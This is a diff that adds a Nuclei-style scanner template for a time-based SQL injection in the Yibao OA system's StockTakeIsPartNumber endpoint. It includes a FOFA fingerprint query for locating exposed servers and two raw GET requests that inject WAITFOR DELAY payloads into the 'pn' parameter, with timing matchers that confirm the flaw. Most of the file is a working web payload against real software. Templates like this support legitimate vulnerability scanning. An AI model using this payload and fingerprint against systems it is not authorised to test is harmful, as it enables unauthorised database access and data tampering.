@@ -1,0 +1,27 @@
+id: yibao-oa-stocktakeispartnumber-sqli
+info:
+  name: 易宝OA系统StockTakeIsPartNumber组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: (title="欢迎登录易宝OA系统" && body="/Content/css/OAstyle.css") || body="$.cookie(\"topvision_oaName"
+      该漏洞源于易宝OA系统StockTakeIsPartNumber组件未正确过滤用户输入参数，攻击者可通过构造恶意SQL语句实现数据库敏感信息获取或数据篡改。系统在处理特定接口请求时存在输入验证缺陷，允许远程执行未经授权的数据库操作。
+  tags: 易宝OA
+http:
+- raw:
+  - |
+    GET /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+  - |
+    GET /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
